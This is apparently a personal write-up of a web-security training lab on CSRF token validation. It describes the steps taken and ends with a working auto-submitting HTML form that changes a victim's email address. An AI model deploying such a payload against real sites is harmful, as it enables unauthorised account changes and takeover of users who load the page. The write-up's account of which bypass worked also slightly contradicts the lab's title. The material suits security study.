
# CSRF where token validation depends on token being present

## What do we know?
- site is vulnerable to Cross Site Request Forgery attack
- site implements CSRF token as one of POST parameters

## What do we have to do?
- change viewer's email address

## Solution:
Lab title tells that vulnerable site checks if request parameter is present, my first thought was "What if I don't pass csrf paremeter".
I had logged into website with given credentials and changed email. In Burp Suite i saw that website uses POST method to change email. 

I tried to send request without CSRF token, but it failed. I knew i had to do something with it, so i tried changing it's value, with no effect. Finally I decided to change csrf field into something different and it worked. My request ad "a" field instead of "csrf"

I went to exploitation server and prepared script sending request as above.

## Final payload looks like this:
File:

`/exploit.html`

Head:

`HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8`

Body: 
```
<html>
  <body>
    <form action="https://"lab-id-here".web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="new@email" />
      <input type="hidden" name="a" value="bAO48xPk9Cmv3VWJbAO48xPk9Cmv3VWJ" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
```
